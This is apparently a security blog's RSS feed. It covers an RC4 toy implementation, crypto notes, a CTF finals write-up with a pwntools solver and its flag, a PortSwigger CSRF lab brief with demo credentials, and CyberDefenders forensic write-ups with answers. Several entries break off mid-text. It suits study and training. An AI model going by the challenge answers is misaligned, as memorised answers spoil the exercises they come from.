&lt;li>建立一個 S-box（寫作 S）&lt;/li>
&lt;li>決定密鑰&lt;/li>
&lt;li>建立密鑰列表 K&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>
&lt;p>第二部分 把 S 打亂&lt;/p>
&lt;/li>
&lt;li>
&lt;p>第三部分 加密&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>S &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">2&lt;/span>,&lt;span style="color:#ae81ff">3&lt;/span>,&lt;span style="color:#ae81ff">4&lt;/span>,&lt;span style="color:#ae81ff">5&lt;/span>,&lt;span style="color:#ae81ff">6&lt;/span>,&lt;span style="color:#ae81ff">7&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>K &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">2&lt;/span>,&lt;span style="color:#ae81ff">3&lt;/span>,&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">2&lt;/span>,&lt;span style="color:#ae81ff">3&lt;/span>,&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">2&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>P &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">5&lt;/span>,&lt;span style="color:#ae81ff">3&lt;/span>,&lt;span style="color:#ae81ff">6&lt;/span>,&lt;span style="color:#ae81ff">7&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>j &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">8&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> j &lt;span style="color:#f92672">=&lt;/span> ( j &lt;span style="color:#f92672">+&lt;/span> S[i] &lt;span style="color:#f92672">+&lt;/span> K[i] ) &lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> S[i], S[j] &lt;span style="color:#f92672">=&lt;/span> S[j], S[i]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>i, j &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c_list &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span> flag &lt;span style="color:#f92672">&amp;lt;&lt;/span> len(P):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> i &lt;span style="color:#f92672">=&lt;/span> (i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> j &lt;span style="color:#f92672">=&lt;/span> (j &lt;span style="color:#f92672">+&lt;/span>S[i]) &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> S[i], S[j] &lt;span style="color:#f92672">=&lt;/span> S[j], S[i]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t &lt;span style="color:#f92672">=&lt;/span> (S[i] &lt;span style="color:#f92672">+&lt;/span> S[j] ) &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> k &lt;span style="color:#f92672">=&lt;/span> S[t]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> k &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{:03b}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(k)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{:03b}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(P[flag])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> c &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> n &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">3&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> c &lt;span style="color:#f92672">+=&lt;/span> str(int(k[n])&lt;span style="color:#f92672">^&lt;/span>int(p[n]))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> c_list&lt;span style="color:#f92672">.&lt;/span>append(int(c, &lt;span style="color:#ae81ff">2&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> flag &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(c_list)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>Drawback&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>RC4在後來被指出他所產生的密鑰並不隨機，存在統計上的偏誤，並且密文有洩漏明文資訊的可能，
因此已不再被建議使用。
:::&lt;/p></description></item><item><title>Cryptography Lec 6(Key Agreement Protocol) - Notes</title><link>https://bernie6401.github.io/docs/security/course/ntu-crypto/cryptography-lec-6key-agreement-protocol---notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-crypto/cryptography-lec-6key-agreement-protocol---notes/</guid><description>&lt;h1 id="cryptography-lec-6key-agreement-protocol---notes">
 Cryptography Lec 6(Key Agreement Protocol) - Notes
 &lt;a class="anchor" href="#cryptography-lec-6key-agreement-protocol---notes">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-cryptography-ntu">
 tags: &lt;code>Cryptography&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-cryptography-ntu">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/2LOnp3Tw-Uo">About HSM(Hardware Security Module) - 什麼是硬體安全模組？&lt;/a>&lt;/p>
&lt;hr>
&lt;p>&lt;a href="https://www.geeksforgeeks.org/what-is-wide-mouth-frog/">What is Wide-Mouth Frog?&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>The Wide Mouth Frog Protocol is a computer network verification protocol typically used on unsecured networks. It permits people communicating over a network to verify their identity to each other, it also helps in preventing replay attacks, or snooping and offers detection of any alteration and the prevention of any unwanted reading. This can be demonstrated by means of BAN (Burrows–Abadi–Needham) logic. However, to avoid active attacks, some form of message authentication or authenticated encryption must be used.&lt;/p></description></item><item><title>CSC 2023 決賽</title><link>https://bernie6401.github.io/docs/security/competition/csc-2023-%E6%B1%BA%E8%B3%BD/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/csc-2023-%E6%B1%BA%E8%B3%BD/</guid><description>&lt;h1 id="csc-ctf-2023-決賽">
 CSC CTF 2023 決賽
 &lt;a class="anchor" href="#csc-ctf-2023-%e6%b1%ba%e8%b3%bd">#&lt;/a>
&lt;/h1>
&lt;p>隊伍名稱: 名字好難想RRRRRRRRRRRRRRR&lt;/p>
&lt;h2 id="教學題">
 教學題
 &lt;a class="anchor" href="#%e6%95%99%e5%ad%b8%e9%a1%8c">#&lt;/a>
&lt;/h2>
&lt;h3 id="q4">
 Q4
 &lt;a class="anchor" href="#q4">#&lt;/a>
&lt;/h3>
&lt;h4 id="題目敘述">
 題目敘述
 &lt;a class="anchor" href="#%e9%a1%8c%e7%9b%ae%e6%95%98%e8%bf%b0">#&lt;/a>
&lt;/h4>
&lt;blockquote>
&lt;p>成為「admin」並取得Flag&lt;/p>
&lt;p>[連線IP/連結資訊]
http://192.168.100.71&lt;/p>
&lt;p>[備註]
答題系統Flag輸入格式：CSC{FLAG_最多長度25可包含數字、英文大小寫、特殊字元及底線}&lt;/p>&lt;/blockquote>
&lt;h4 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h4>
&lt;p>這一題太難了，看了教學檔案還是沒辦法在有效時間內解出來，所以放棄
學長自述:&lt;/p>
&lt;h3 id="q5">
 Q5
 &lt;a class="anchor" href="#q5">#&lt;/a>
&lt;/h3>
&lt;h4 id="題目敘述-1">
 題目敘述
 &lt;a class="anchor" href="#%e9%a1%8c%e7%9b%ae%e6%95%98%e8%bf%b0-1">#&lt;/a>
&lt;/h4>
&lt;blockquote>
&lt;p>壞壞恐怖組織要對這邊進行恐攻，丟了一顆定時炸彈，拆彈專家4你???拆彈成功領取豐沛的獎勵吧!&lt;/p>
&lt;p>[備註]
答題系統Flag輸入格式：CSC{FLAG_最多長度25可包含數字、英文大小寫、特殊字元及底線}&lt;/p>&lt;/blockquote>
&lt;h4 id="exploit-1">
 Exploit
 &lt;a class="anchor" href="#exploit-1">#&lt;/a>
&lt;/h4>
&lt;p>測驗智商用的，直接pwntools就可以了&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!" data-lang="python!">from pwn import *

r = process(&amp;#39;./Bomb.exe&amp;#39;)
r.recvuntil(b&amp;#39;P1ease count A(&amp;#39;)
A = r.recvuntil(b&amp;#39;)&amp;#39;)[:-1].decode()
sign = r.recv(3).decode()
B = r.recvline()[2:-2].decode()

log.info(f&amp;#39;A({A}) {sign} B({B}) = {eval(A + sign + B)}&amp;#39;)
r.sendlineafter(b&amp;#39;Enter your answer: &amp;#39;, str(eval(A + sign + B)).encode())

r.interactive()
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ python exp.py
[+] Starting local process &amp;#39;./Bomb.exe&amp;#39;: pid 8143
[*] A(1507886) + B(7372399) = 8880285
[*] Switching to interactive mode

Good job!\(^^)/
CSC{FLAG_54v3th3d4y7777777}Time&amp;#39;s up! (っ•O•)╮ =͟͟͞͞●~*
[*] Got EOF while reading in interactive
&lt;/code>&lt;/pre>&lt;p>Flag: &lt;code>CSC{FLAG_54v3th3d4y7777777}&lt;/code>&lt;/p></description></item><item><title>CSRF - APPRENTICE</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/csrf---apprentice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/csrf---apprentice/</guid><description>&lt;h1 id="csrf---apprentice">
 CSRF - APPRENTICE
 &lt;a class="anchor" href="#csrf---apprentice">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="lab-csrf-vulnerability-with-no-defenses">
 Lab: CSRF vulnerability with no defenses
 &lt;a class="anchor" href="#lab-csrf-vulnerability-with-no-defenses">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Description: This lab&amp;rsquo;s email change functionality is vulnerable to CSRF.&lt;/li>
&lt;li>Goal: To solve the lab, craft some HTML that uses a CSRF attack to change the viewer&amp;rsquo;s email address and upload it to your exploit server.
You can log in to your own account using the following credentials: &lt;code>wiener:peter&lt;/code>&lt;/li>
&lt;li>Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.&lt;/li>
&lt;/ul>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler
&lt;a href="https://medium.com/@Tommmmm/csrf-%e6%94%bb%e6%93%8a%e5%8e%9f%e7%90%86-d0f2a51810ca">CSRF 攻擊原理&lt;/a>
&lt;a href="https://ithelp.ithome.com.tw/articles/10251769">[Day25]- 新手的Web系列CSRF&lt;/a>&lt;/p></description></item><item><title>CyberDefender - BlackEnergy</title><link>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/cyberdefender---blackenergy/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/cyberdefender---blackenergy/</guid><description>&lt;h1 id="cyberdefender---blackenergy">
 CyberDefender - BlackEnergy
 &lt;a class="anchor" href="#cyberdefender---blackenergy">#&lt;/a>
&lt;/h1>
&lt;p>:::spoiler TOC
[TOC]
:::
Challenge: &lt;a href="https://cyberdefenders.org/blueteam-ctf-challenges/99">https://cyberdefenders.org/blueteam-ctf-challenges/99&lt;/a>&lt;/p>
&lt;h2 id="scenario">
 Scenario
 &lt;a class="anchor" href="#scenario">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>A multinational corporation has been hit by a cyber attack that has led to the theft of sensitive data. The attack was carried out using a variant of the BlackEnergy v2 malware that has never been seen before. The company&amp;rsquo;s security team has acquired a memory dump of the infected machine, and they want you, as a soc analyst, to analyze the dump to understand the attack scope and impact.&lt;/p></description></item><item><title>CyberDefender - CorporateSecrets (Part 1)</title><link>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-1/</guid><description>&lt;h1 id="cyberdefender---corporatesecrets-part-1">
 CyberDefender - CorporateSecrets (Part 1)
 &lt;a class="anchor" href="#cyberdefender---corporatesecrets-part-1">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://cyberdefenders.org/blueteam-ctf-challenges/33">https://cyberdefenders.org/blueteam-ctf-challenges/33&lt;/a>
Part 2: &lt;a href="https://hackmd.io/@SBK6401/ByFhEE8X6">https://hackmd.io/@SBK6401/ByFhEE8X6&lt;/a>
Part 3: &lt;a href="https://hackmd.io/@SBK6401/HyHp4NLQT">https://hackmd.io/@SBK6401/HyHp4NLQT&lt;/a>
Part 4: &lt;a href="https://hackmd.io/@SBK6401/H1rAEV87p">https://hackmd.io/@SBK6401/H1rAEV87p&lt;/a>&lt;/p>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="tools">
 Tools:
 &lt;a class="anchor" href="#tools">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>FTK Imager&lt;/li>
&lt;li>Registry Explorer&lt;/li>
&lt;li>RegRipper&lt;/li>
&lt;li>HxD&lt;/li>
&lt;li>DB Browser for SQLite&lt;/li>
&lt;li>HindSight&lt;/li>
&lt;li>Event Log Explorer&lt;/li>
&lt;li>MFTDump&lt;/li>
&lt;/ul>
&lt;h2 id="q1">
 ==Q1==
 &lt;a class="anchor" href="#q1">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>What is the current build number on the system?&lt;/p>&lt;/blockquote>
&lt;h3 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h3>
&lt;p>直接把Software hive從&lt;code>root/Windows/System32/config/&lt;/code> export出來後找&lt;code>Microsoft/Windows NT/CurrentVersion&lt;/code>中就有紀錄CurrentBuild number
&lt;img src="https://hackmd.io/_uploads/ryvoSV8mT.png" alt="圖片.png" />
:::spoiler Result
&lt;img src="https://hackmd.io/_uploads/rJpJ8EUXa.png" alt="圖片.png" />
:::&lt;/p>
&lt;p>:::spoiler Flag
Flag: &lt;code>16299&lt;/code>
:::&lt;/p>
&lt;h2 id="q2">
 ==Q2==
 &lt;a class="anchor" href="#q2">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>How many users are there?&lt;/p></description></item><item><title>CyberDefender - CorporateSecrets (Part 2)</title><link>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-2/</guid><description>&lt;h1 id="cyberdefender---corporatesecrets-part-2">
 CyberDefender - CorporateSecrets (Part 2)
 &lt;a class="anchor" href="#cyberdefender---corporatesecrets-part-2">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://cyberdefenders.org/blueteam-ctf-challenges/33">https://cyberdefenders.org/blueteam-ctf-challenges/33&lt;/a>
Part 1: &lt;a href="https://hackmd.io/@SBK6401/r18z7VIm6">https://hackmd.io/@SBK6401/r18z7VIm6&lt;/a>
Part 3: &lt;a href="https://hackmd.io/@SBK6401/HyHp4NLQT">https://hackmd.io/@SBK6401/HyHp4NLQT&lt;/a>
Part 4: &lt;a href="https://hackmd.io/@SBK6401/H1rAEV87p">https://hackmd.io/@SBK6401/H1rAEV87p&lt;/a>&lt;/p>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="tools">
 Tools:
 &lt;a class="anchor" href="#tools">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>FTK Imager&lt;/li>
&lt;li>Registry Explorer&lt;/li>
&lt;li>RegRipper&lt;/li>
&lt;li>HxD&lt;/li>
&lt;li>DB Browser for SQLite&lt;/li>
&lt;li>HindSight&lt;/li>
&lt;li>Event Log Explorer&lt;/li>
&lt;li>MFTDump&lt;/li>
&lt;/ul>
&lt;h2 id="q10">
 ==Q10==
 &lt;a class="anchor" href="#q10">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>What is the SID of the machine?&lt;/p>&lt;/blockquote>
&lt;h3 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h3>
&lt;p>直接看&lt;code>SOFTWARE/Microsoft/Windows NT/CurrentVersion/ProfileList&lt;/code>就知道了
&lt;img src="https://hackmd.io/_uploads/ry8fOuU7T.png" alt="圖片.png" />&lt;/p>
&lt;p>:::spoiler Flag
Flag: &lt;code>S-1-5-21-2446097003-76624807-2828106174&lt;/code>
:::&lt;/p>
&lt;h2 id="q11">
 ==Q11==
 &lt;a class="anchor" href="#q11">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>How many web browsers are present?&lt;/p>&lt;/blockquote>
&lt;h3 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h3>
&lt;p>直接搜索一下所有user的AppData或是program1，可以發現有五個瀏覽器(Firefox / Internet Explorer / Chrome / Edge / Tor)
&lt;img src="https://hackmd.io/_uploads/HkKLxF8Xp.png" alt="圖片.png" />&lt;/p></description></item><item><title>CyberDefender - CorporateSecrets (Part 3)</title><link>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-3/</guid><description>&lt;h1 id="cyberdefender---corporatesecrets-part-3">
 CyberDefender - CorporateSecrets (Part 3)
 &lt;a class="anchor" href="#cyberdefender---corporatesecrets-part-3">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://cyberdefenders.org/blueteam-ctf-challenges/33">https://cyberdefenders.org/blueteam-ctf-challenges/33&lt;/a>
Part 1: &lt;a href="https://hackmd.io/@SBK6401/r18z7VIm6">https://hackmd.io/@SBK6401/r18z7VIm6&lt;/a>
Part 2: &lt;a href="https://hackmd.io/@SBK6401/ByFhEE8X6">https://hackmd.io/@SBK6401/ByFhEE8X6&lt;/a>
Part 4: &lt;a href="https://hackmd.io/@SBK6401/H1rAEV87p">https://hackmd.io/@SBK6401/H1rAEV87p&lt;/a>&lt;/p>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="tools">
 Tools:
 &lt;a class="anchor" href="#tools">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>FTK Imager&lt;/li>
&lt;li>Registry Explorer&lt;/li>
&lt;li>RegRipper&lt;/li>
&lt;li>HxD&lt;/li>
&lt;li>DB Browser for SQLite&lt;/li>
&lt;li>HindSight&lt;/li>
&lt;li>Event Log Explorer&lt;/li>
&lt;li>MFTDump&lt;/li>
&lt;/ul>
&lt;h2 id="q19">
 ==Q19==
 &lt;a class="anchor" href="#q19">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>Which user installed LibreCAD on the system?&lt;/p>&lt;/blockquote>
&lt;h3 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h3>
&lt;p>我是直接看該檔案在哪個user的資料夾來判斷，當然這個做法有點問題&lt;/p>
&lt;p>:::spoiler Flag
Flag: &lt;code>miriam.grapes&lt;/code>
:::&lt;/p>
&lt;h2 id="q20">
 ==Q20==
 &lt;a class="anchor" href="#q20">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>How many times &amp;ldquo;admin&amp;rdquo; logged into the system?&lt;/p>&lt;/blockquote>
&lt;h3 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h3>
&lt;p>呈第14題&lt;/p></description></item><item><title>CyberDefender - CorporateSecrets (Part 4)</title><link>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-4/</guid><description>&lt;h1 id="cyberdefender---corporatesecrets-part-4">
 CyberDefender - CorporateSecrets (Part 4)
 &lt;a class="anchor" href="#cyberdefender---corporatesecrets-part-4">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://cyberdefenders.org/blueteam-ctf-challenges/33">https://cyberdefenders.org/blueteam-ctf-challenges/33&lt;/a>
Part 1: &lt;a href="https://hackmd.io/@SBK6401/r18z7VIm6">https://hackmd.io/@SBK6401/r18z7VIm6&lt;/a>
Part 2: &lt;a href="https://hackmd.io/@SBK6401/ByFhEE8X6">https://hackmd.io/@SBK6401/ByFhEE8X6&lt;/a>
Part 3: &lt;a href="https://hackmd.io/@SBK6401/HyHp4NLQT">https://hackmd.io/@SBK6401/HyHp4NLQT&lt;/a>&lt;/p>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="tools">
 Tools:
 &lt;a class="anchor" href="#tools">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>FTK Imager&lt;/li>
&lt;li>Registry Explorer&lt;/li>
&lt;li>RegRipper&lt;/li>
&lt;li>HxD&lt;/li>
&lt;li>DB Browser for SQLite&lt;/li>
&lt;li>HindSight&lt;/li>
&lt;li>Event Log Explorer&lt;/li>
&lt;li>MFTDump&lt;/li>
&lt;/ul>
&lt;h2 id="q28">
 ==Q28==
 &lt;a class="anchor" href="#q28">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>What cloud service was a Startup item for the user admin?&lt;/p>&lt;/blockquote>
&lt;h3 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h3>
&lt;p>直接看admin的NTUSER.DAT中的&lt;code>./Software/Microsoft/Windows/CurrentVersion/Run&lt;/code>就可以了&lt;/p>
&lt;h3 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h3>
&lt;p>&lt;img src="https://hackmd.io/_uploads/BJodWuDmp.png" alt="圖片.png" />&lt;/p>
&lt;p>:::spoiler Flag
Flag: &lt;code>OneDrive&lt;/code>
:::&lt;/p>
&lt;h2 id="q29">
 ==Q29==
 &lt;a class="anchor" href="#q29">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>Which Firefox prefetch file has the most runtimes?
(Flag format is )&lt;/p></description></item><item><title>CyberDefender - GrabThePhisher</title><link>https://bernie6401.github.io/docs/security/practice/cyberdefender/threat-intel/cyberdefender---grabthephisher/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/cyberdefender/threat-intel/cyberdefender---grabthephisher/</guid><description>&lt;h1 id="cyberdefender---grabthephisher">
 CyberDefender - GrabThePhisher
 &lt;a class="anchor" href="#cyberdefender---grabthephisher">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://cyberdefenders.org/blueteam-ctf-challenges/95">https://cyberdefenders.org/blueteam-ctf-challenges/95&lt;/a>&lt;/p>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="scenario">
 Scenario
 &lt;a class="anchor" href="#scenario">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>An attacker compromised a server and impersonated &lt;a href="https://pancakeswap.finance/">https://pancakeswap.finance/&lt;/a>, a decentralized exchange native to BNB Chain, to host a phishing kit at &lt;a href="https://apankewk.soup.xyz/mainpage.php">https://apankewk.soup.xyz/mainpage.php&lt;/a>. The attacker set it as an open directory with the file name &amp;ldquo;pankewk.zip&amp;rdquo;.&lt;/p>
&lt;p>Provided the phishing kit, you as a soc analyst are requested to analyze it and do your threat intel homework.&lt;/p>&lt;/blockquote>
&lt;h2 id="q1">
 ==Q1==
 &lt;a class="anchor" href="#q1">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>Which wallet is used for asking the seed phrase?&lt;/p></description></item><item><title>CyberDefender - Hunter (Part 1)</title><link>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/hunter---medium/cyberdefender---hunter-part-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/hunter---medium/cyberdefender---hunter-part-1/</guid><description>&lt;h1 id="cyberdefender---hunter-part-1">
 CyberDefender - Hunter (Part 1)
 &lt;a class="anchor" href="#cyberdefender---hunter-part-1">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://cyberdefenders.org/blueteam-ctf-challenges/32">https://cyberdefenders.org/blueteam-ctf-challenges/32&lt;/a>
Part 2: &lt;a href="https://hackmd.io/@SBK6401/HJlmeuwfT">https://hackmd.io/@SBK6401/HJlmeuwfT&lt;/a>
Part 3: &lt;a href="https://hackmd.io/@SBK6401/HylP8ixQp">https://hackmd.io/@SBK6401/HylP8ixQp&lt;/a>&lt;/p>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="scenario">
 Scenario
 &lt;a class="anchor" href="#scenario">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>The SOC team got an alert regarding some illegal port scanning activity coming from an employee&amp;rsquo;s system. The employee was not authorized to do any port scanning or any offensive hacking activity within the network. The employee claimed that he had no idea about that, and it is probably a malware acting on his behalf. The IR team managed to respond immediately and take a full forensic image of the user&amp;rsquo;s system to perform some investigations.&lt;/p></description></item><item><title>CyberDefender - Hunter (Part 2)</title><link>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/hunter---medium/cyberdefender---hunter-part-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/hunter---medium/cyberdefender---hunter-part-2/</guid><description>&lt;h1 id="cyberdefender---hunter-part-2">
 CyberDefender - Hunter (Part 2)
 &lt;a class="anchor" href="#cyberdefender---hunter-part-2">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://cyberdefenders.org/blueteam-ctf-challenges/32">https://cyberdefenders.org/blueteam-ctf-challenges/32&lt;/a>
